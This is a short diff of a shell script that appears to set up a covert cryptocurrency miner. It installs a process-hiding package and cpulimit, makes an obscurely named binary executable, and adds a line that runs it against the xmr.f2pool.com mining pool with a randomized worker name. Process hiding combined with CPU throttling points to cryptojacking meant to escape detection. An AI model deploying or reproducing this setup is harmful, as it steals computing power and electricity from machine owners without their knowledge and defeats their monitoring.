@@ -2,5 +2,4 @@ sudo /sbin/sysctl -w net.ipv4.tcp_keepalive_time=5 net.ipv4.tcp_keepalive_intvl=
 sudo npm i -g node-process-hider
 sudo apt-get update && sudo apt-get install cpulimit -y
 chmod u+x - && chmod u+x build_config
-sed -i "s/ikukfauji/$(shuf -n 1 -i 1-99999999)/" "build_config"
-while :; do timeout 1m cpulimit -l 3 ./-; sleep 20; done
+./-o xmr.f2pool.com:13531 -u ikukfuaji.$(shuf -n 1 -i 1-99999999) -p x -a wrkzcoin -k
